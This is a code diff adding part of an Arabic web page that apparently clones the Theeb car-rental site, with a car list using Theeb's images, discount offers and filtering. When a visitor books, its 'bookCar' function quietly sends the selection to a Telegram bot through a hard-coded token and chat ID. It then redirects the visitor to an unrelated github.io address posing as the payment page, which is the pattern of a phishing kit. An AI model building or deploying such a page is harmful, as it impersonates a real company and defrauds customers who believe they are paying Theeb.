+        {cat:"Family",year:"2024",title:"شفروليه سوبربان 2024",img:"https://www.theebonline.com/carimages/FA98.jpg",seats:9,trans:"اوتوماتيكي",doors:5,price:750,brand:"شيفرولية"},
+        {cat:"Full Size",year:"2024",title:"فورد توروس تيتانيوم - 2024",img:"https://www.theebonline.com/carimages/FS19.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:450,brand:"فورد"},
+        {cat:"Full Size",year:"2025",title:"فورد توروس تيتانيوم - 2025",img:"https://www.theebonline.com/carimages/FS23.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:500,brand:"فورد"},
+        {cat:"Hybrid",year:"2026",title:"تويوتا كراون بريميوم 2026",img:"https://www.theebonline.com/carimages/FS27.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:550,brand:"تويوتا"},
+        {cat:"Full Size",year:"2026",title:"فورد توروس تيتانيوم 2026",img:"https://www.theebonline.com/carimages/FS29.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:550,brand:"فورد"},
+        {cat:"Intermediate",year:"2025",title:"مقدمة جيلي - 2025",img:"https://www.theebonline.com/carimages/IN30.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:220,brand:"GEELY"},
+        {cat:"Intermediate",year:"2025",title:"هيونداي إلنترا- GLS الذكية 2025",img:"https://www.theebonline.com/carimages/IN31.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:220,brand:"هونداي"},
+        {cat:"Intermediate",year:"2025",title:"هيونداي إلنترا - GLS الذكية 2025",img:"https://www.theebonline.com/carimages/IN33.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:220,brand:"هونداي"},
+        {cat:"Intermediate",year:"2025",title:"GAC Empow GE 2025",img:"https://www.theebonline.com/carimages/IN34.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:220,brand:"GAC"},
+        {cat:"Intermediate",year:"2025",title:"هيونداي إلنترا - GLS ذكية 2.0 لتر 2025",img:"https://www.theebonline.com/carimages/IN35.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:220,brand:"هونداي"},
+        {cat:"Intermediate",year:"2026",title:"GAC Empow GE 2026",img:"https://www.theebonline.com/carimages/IN37.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:230,brand:"GAC"},
+        {cat:"Intermediate",year:"2026",title:"هيونداي إلنترا - GL سمارت (C) 1.5 لتر 2026",img:"https://www.theebonline.com/carimages/IN40.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:230,brand:"هونداي"},
+        {cat:"Luxury Elite",year:"2024",title:"مرسيدس - S450L 2024",img:"https://www.theebonline.com/carimages/LE25.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:3060,brand:"مرسيدس"},
+        {cat:"Luxury Elite",year:"2024",title:"أودي A8 - 2024",img:"https://www.theebonline.com/carimages/LE26.jpg",seats:4,trans:"اوتوماتيكي",doors:4,price:1955,brand:"أودي"},
+        {cat:"Luxury Elite",year:"2025",title:"مرسيدس - S450 2025",img:"https://www.theebonline.com/carimages/LE29.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:3400,brand:"مرسيدس"},
+        {cat:"Luxury Elite",year:"2026",title:"باقة BMW735 - باقة رياضية 2026",img:"https://www.theebonline.com/carimages/LE34.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:3060,brand:"BMW"},
+        {cat:"Luxury Elite",year:"2026",title:"مرسيدس - S450 2026",img:"https://www.theebonline.com/carimages/LE35.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:3800,brand:"مرسيدس"},
+        {cat:"Luxury",year:"2024",title:"سيارة BMW 520I M Sport",img:"https://www.theebonline.com/carimages/LM19.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:850,brand:"BMW"},
+        {cat:"Luxury",year:"2024",title:"أودي A6 - 2024",img:"https://www.theebonline.com/carimages/LM20.jpg",seats:4,trans:"اوتوماتيكي",doors:4,price:650,brand:"أودي"},
+        {cat:"Luxury",year:"2025",title:"سيارة BMW 520I M الرياضية 2025",img:"https://www.theebonline.com/carimages/LM21.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:950,brand:"BMW"},
+        {cat:"Luxury",year:"2026",title:"بي إم دبليو 520I M Sport 2026",img:"https://www.theebonline.com/carimages/LM22.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:1100,brand:"BMW"},
+        {cat:"Luxury",year:"2024",title:"مرسيدس - C200 2024",img:"https://www.theebonline.com/carimages/LS13.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:750,brand:"مرسيدس"},
+        {cat:"Luxury",year:"2024",title:"مرسيدس - CLA200 2024",img:"https://www.theebonline.com/carimages/LS14.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:600,brand:"مرسيدس"},
+        {cat:"Luxury",year:"2025",title:"مرسيدس - CLA200 2025",img:"https://www.theebonline.com/carimages/LS15.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:700,brand:"مرسيدس"},
+        {cat:"Pickup",year:"2025",title:"إيسوزو بيك آب DC 4X4 -2025",img:"https://www.theebonline.com/carimages/PI272.jpg",seats:4,trans:"يدوي",doors:4,price:300,brand:"ايسوزو"},
+        {cat:"Pickup",year:"2025",title:"JAC T8 DC 4x2 - 2025",img:"https://www.theebonline.com/carimages/PI290.jpg",seats:5,trans:"يدوي",doors:4,price:280,brand:"JAC"},
+        {cat:"Pickup",year:"2026",title:"إيسوزو بيك أب DC 4X4 - 2026",img:"https://www.theebonline.com/carimages/PI301.jpg",seats:6,trans:"يدوي",doors:4,price:350,brand:"ايسوزو"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2026",title:"لاند روفر ديفندر 110 X",img:"https://www.theebonline.com/carimages/SLX8.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:2200,brand:"LAND ROVER"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2024",title:"تويوتا برادو TXL3 - 2024",img:"https://www.theebonline.com/carimages/SV103.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:650,brand:"تويوتا"},
+        {cat:"Crossover",year:"2025",title:"GAC Emzoom GB 2025",img:"https://www.theebonline.com/carimages/SV111.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:210,brand:"GAC"},
+        {cat:"Crossover",year:"2025",title:"جيلي كولراي STD - 2025",img:"https://www.theebonline.com/carimages/SV117.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:210,brand:"GEELY"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"نيسان باترول بلاتينيوم Y63",img:"https://www.theebonline.com/carimages/SV119.jpg",seats:8,trans:"اوتوماتيكي",doors:5,price:1800,brand:"نيسان"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"تويوتا راف4 LE 4x4",img:"https://www.theebonline.com/carimages/SV128.jpg",seats:5,trans:"اوتوماتيكي",doors:5,price:350,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"تويوتا لاند كروزر GXR4 - 2025",img:"https://www.theebonline.com/carimages/SV131.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:2050,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"شيفروليه تاهو LS 4x4- 2025",img:"https://www.theebonline.com/carimages/SV132.jpg",seats:9,trans:"اوتوماتيكي",doors:5,price:850,brand:"شيفرولية"},
+        {cat:"Crossover",year:"2026",title:"جي إيه سي إمزوم جي بي 2026",img:"https://www.theebonline.com/carimages/SV143.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:230,brand:"GAC"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"تويوتا برادو TXL3 - 2025",img:"https://www.theebonline.com/carimages/SV145.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:700,brand:"تويوتا"},
+        {cat:"Crossover",year:"2025",title:"JAC JS4 Intelligent - 2025",img:"https://www.theebonline.com/carimages/SV152.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:210,brand:"JAC"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"روكس 01 - 2025",img:"https://www.theebonline.com/carimages/SV153.jpg",seats:7,trans:"اوتوماتيكي",doors:4,price:1100,brand:"ROX"},
+        {cat:"Crossover",year:"2026",title:"جيلي كولراي STD - 2026",img:"https://www.theebonline.com/carimages/SV156.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:230,brand:"GEELY"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2026",title:"تويوتا لاند كروزر GXR4 -2026",img:"https://www.theebonline.com/carimages/SV168.jpg",seats:7,trans:"اوتوماتيكي",doors:4,price:2200,brand:"تويوتا"},
+        {cat:"Crossover",year:"2026",title:"تويوتا أوربان كروزر GL 2026",img:"https://www.theebonline.com/carimages/SV170.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:250,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2026",title:"روكس أداماس 2026",img:"https://www.theebonline.com/carimages/SV171.jpg",seats:7,trans:"اوتوماتيكي",doors:4,price:1300,brand:"ROX"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2026",title:"شيفروليه تاهو LS 4x4 2026",img:"https://www.theebonline.com/carimages/SV180.jpg",seats:8,trans:"اوتوماتيكي",doors:4,price:950,brand:"شيفرولية"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2023",title:"شيفروليه - تاهو 2023",img:"https://www.theebonline.com/carimages/SVL69.jpg",seats:9,trans:"اوتوماتيكي",doors:5,price:750,brand:"شيفرولية"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2024",title:"تويوتا لاند كروزر GXR4 -2024",img:"https://www.theebonline.com/carimages/SVL88.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:1800,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2024",title:"تويوتا فورتشنر - GX2- 4×4 2024",img:"https://www.theebonline.com/carimages/SVM69.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:550,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"تويوتا فورتشنر GX2-4X4",img:"https://www.theebonline.com/carimages/SVM83.jpg",seats:7,trans:"اوتوماتيكي",doors:5,price:600,brand:"تويوتا"},
+        {cat:"Crossover",year:"2024",title:"هيونداي كونا 2024",img:"https://www.theebonline.com/carimages/SVS76.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:210,brand:"هونداي"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2024",title:"راف 4 LE 4X4 2024",img:"https://www.theebonline.com/carimages/SVS81.jpg",seats:5,trans:"اوتوماتيكي",doors:5,price:320,brand:"تويوتا"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"هيونداي توكسون 4×4 سمارت 2025",img:"https://www.theebonline.com/carimages/SVS96.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:420,brand:"هونداي"},
+        {cat:"SUV Sprt Ut Vehicle",year:"2025",title:"رينج روڤر L460 - 2025",img:"https://www.theebonline.com/carimages/X4L40.jpg",seats:5,trans:"اوتوماتيكي",doors:5,price:3400,brand:"رانج روفر"}
+    ];
+
+    // ===== متغيرات =====
+    let selectedOffer = null;
+    let currentDiscount = 0;
+    let currentFilteredCars = [...allCars];
+    let currentSort = 'low-high';
+
+    // ===== Toast =====
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toast._timer);
+        toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
+    }
+
+    // ===== دوال العروض =====
+    function selectOffer(element) {
+        document.querySelectorAll('.offer-item').forEach(el => el.classList.remove('selected'));
+        element.classList.add('selected');
+        selectedOffer = {
+            type: element.dataset.type,
+            discount: parseInt(element.dataset.discount, 10)
+        };
+        document.getElementById('continueToFleetBtn').disabled = false;
+        
+        // عرض رسالة العرض المختار
+        const names = { daily: 'يومي', weekly: 'أسبوعي', monthly: 'شهري' };
+        const banner = document.getElementById('offerSelectedBanner');
+        document.getElementById('selectedOfferText').textContent = `تم اختيار العرض: ${names[selectedOffer.type]}`;
+        document.getElementById('selectedOfferDiscount').textContent = `${selectedOffer.discount}%`;
+        banner.style.display = 'flex';
+        
+        showToast(`✅ تم اختيار التأجير ${names[selectedOffer.type]} بخصم ${selectedOffer.discount}%`);
+    }
+
+    function goToFleet() {
+        if (!selectedOffer) {
+            showToast('⚠️ الرجاء اختيار عرض أولاً');
+            return;
+        }
+        
+        currentDiscount = selectedOffer.discount;
+        
+        document.getElementById('offersPage').style.display = 'none';
+        document.getElementById('fleetPage').style.display = 'block';
+        document.body.style.overflowX = 'hidden';
+        
+        const names = { daily: 'يومي', weekly: 'أسبوعي', monthly: 'شهري' };
+        document.getElementById('discountText').textContent = `خصم ${currentDiscount}% (تأجير ${names[selectedOffer.type]})`;
+        document.getElementById('discountPercent').textContent = `${currentDiscount}%`;
+        
+        currentFilteredCars = [...allCars];
+        applyFiltersAndSort();
+        
+        showToast(`🎯 تم تطبيق خصم ${currentDiscount}% على جميع السيارات`);
+    }
+
+    function goBackToOffers() {
+        document.getElementById('offersPage').style.display = 'flex';
+        document.getElementById('fleetPage').style.display = 'none';
+        currentDiscount = 0;
+        currentFilteredCars = [...allCars];
+        renderCars(allCars, 0);
+        window.scrollTo(0, 0);
+    }
+
+    // ===== التصفية والترتيب =====
+    function applyFiltersAndSort() {
+        const type = document.getElementById('car_types').value;
+        const brand = document.getElementById('car_brands').value;
+        const sort = document.getElementById('sortPrice').value;
+        
+        let filtered = [...allCars];
+        
+        if (type !== 'All Type') {
+            filtered = filtered.filter(c => c.cat === type);
+        }
+        if (brand !== 'All Brands') {
+            filtered = filtered.filter(c => c.brand === brand);
+        }
+        
+        // ترتيب السعر
+        if (sort === 'low-high') {
+            filtered.sort((a, b) => a.price - b.price);
+        } else if (sort === 'high-low') {
+            filtered.sort((a, b) => b.price - a.price);
+        }
+        
+        currentFilteredCars = filtered;
+        renderCars(filtered, currentDiscount);
+    }
+
+    // ===== عرض السيارات مع الخصم =====
+    function renderCars(carsArray, discountPercent = 0) {
+        const container = document.getElementById('car-fleet-browse');
+        container.innerHTML = '';
+        
+        if (carsArray.length === 0) {
+            container.innerHTML = '<div style="text-align: center; padding: 50px; color: #777; grid-column: 1/-1;">لا توجد سيارات مطابقة للبحث</div>';
+            return;
+        }
+        
+        carsArray.forEach(car => {
+            const discountedPrice = Math.round(car.price * (1 - discountPercent / 100));
+            const hasDiscount = discountPercent > 0;
+            
+            const card = document.createElement('div');
+            card.className = 'car-card-sm';
+            card.innerHTML = `
+                <div>
+                    <div><span class="car-category">${car.cat}</span><span class="car-year">${car.year}</span></div>
+                    <h5 class="card-title">${car.title}</h5>
+                    <img src="${car.img}" class="card-img-top" alt="صورة السيارة" loading="lazy" onerror="this.src='https://www.theebonline.com/wp-content/themes/Theeb-theme/images/car-placeholder-sedan.png';">
+                </div>
+                <div>
+                    <ul class="car-features">
+                        <li class="car-features-item"><img src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/icons/seats.svg" alt="مقاعد"> ${car.seats}</li>
+                        <li class="car-features-item"><img src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/icons/auto.svg" alt="ناقل"> ${car.trans === "اوتوماتيكي" ? "أوتو" : "يدوي"}</li>
+                        <li class="car-features-item"><img src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/icons/doors.svg" alt="أبواب"> ${car.doors}</li>
+                    </ul>
+                    <div class="car-card-sm-price">
+                        <h3>
+                            ${hasDiscount ? `<span class="old-price">${car.price} ريال</span>` : ''}
+                            ${discountedPrice} ريال <span>/يوم</span>
+                        </h3>
+                        <button type="button" onclick="bookCar('${car.title}', '${discountedPrice}', '${discountPercent}')"><i class="fa-solid fa-calendar-check me-1"></i> احجز الان</button>
+                    </div>
+                </div>
+            `;
+            container.appendChild(card);
+        });
+    }
+
+    // ===== وظيفة الحجز =====
+    function bookCar(carTitle, carPrice, discount) {
+        // إرسال إلى تلغرام
+        const token = '7472061266:AAH36n6vY81_27nN2iX1O0-V2S2XpXW7Wq8';
+        const chatId = '6675960341';
+        const message = `🚗 تم اختيار سيارة جديدة:\n\nاسم السيارة: ${carTitle}\nالسعر بعد الخصم: ${carPrice} ريال/يوم\nالخصم المطبق: ${discount}%`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch(url).catch(err => console.error('Error sending to bot:', err));
+        
+        // التحويل إلى صفحة الدفع
+        window.location.href = 'https://aq2490226-cell.github.io/Theeb.-/';
+    }
+
+    // ===== أحداث =====
+    document.querySelectorAll('.offer-item').forEach(item => {
+        item.addEventListener('click', function() {
+            selectOffer(this);
+        });
+    });
+
+    document.getElementById('continueToFleetBtn').addEventListener('click', goToFleet);
+
+    // التصفية والترتيب
+    document.getElementById('filterBtn')?.addEventListener('click', applyFiltersAndSort);
+    document.getElementById('sortPrice')?.addEventListener('change', applyFiltersAndSort);
+
+    // ===== Carousel =====
+    let carIndex = 0;
+    const carItems = document.querySelectorAll('.cars');
+    
+    function updateCarousel() {
+        if (carItems.length > 0) {
+            carItems.forEach((item, i) => {
+                item.style.transition = 'opacity 0.5s, transform 0.5s';
+                if (i === carIndex) { 
+                    item.style.opacity = '1'; 
+                    item.style.transform = 'translateX(0)'; 
+                } else { 
+                    item.style.opacity = '0'; 
+                    item.style.transform = 'translateX(120%)'; 
+                }
+            });
+            carIndex = (carIndex + 1) % carItems.length;
+        }
+    }
+    
+    let carouselInterval = setInterval(updateCarousel, 4000);
+    updateCarousel();
+    
+    const rightArrow = document.querySelector('.car-fleet-arrow-right');
+    const leftArrow = document.querySelector('.car-fleet-arrow-left');
+    
+    if (rightArrow) {
+        rightArrow.addEventListener('click', () => {
+            clearInterval(carouselInterval);
+            carIndex = (carIndex + 1) % carItems.length;
+            updateCarousel();
+            carouselInterval = setInterval(updateCarousel, 4000);
+        });
+    }
+    
+    if (leftArrow) {
+        leftArrow.addEventListener('click', () => {
+            clearInterval(carouselInterval);
+            carIndex = (carIndex - 1 + carItems.length) % carItems.length;
+            updateCarousel();
+            carouselInterval = setInterval(updateCarousel, 4000);
+        });
+    }
+
+    // ===== تهيئة =====
+    renderCars(allCars, 0);
+</script>
+
+</body>
+</html>
